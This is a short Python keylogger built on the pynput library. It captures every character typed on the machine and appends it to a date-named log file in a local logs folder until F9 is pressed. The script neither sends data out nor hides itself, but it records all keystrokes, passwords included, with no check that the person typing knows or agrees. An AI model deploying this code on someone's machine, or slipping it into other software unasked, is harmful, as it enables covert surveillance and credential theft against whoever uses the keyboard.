from time import sleep, time
from pynput import keyboard, mouse
from datetime import date
import sys

day = date.today()
charsperline = 1

listener = ""
stop = False

logpath = "./logs/"+str(day)+".txt"


writer = ""
with open(logpath, "a") as writer:
    currentcharcount = 0
    currentline = ""

    def onkeypress(keyevent):
        global stop
        try:
            if keyevent == keyboard.Key.f9:
                print("Close")
                writer.close()
                stop = True
                listener.stop()
                sys.exit()

            global currentcharcount
            global currentline
            key = keyevent.char
            if currentcharcount+len(key) > charsperline:
                writer.write(currentline+"\n")
                currentcharcount = 0
                currentline = ""

            currentline += key
            currentcharcount += len(key)

        except:
            _ = ""


    listener = keyboard.Listener(on_press=onkeypress)
    listener.start()

    while True:
        if stop:
            break
        sleep(1)
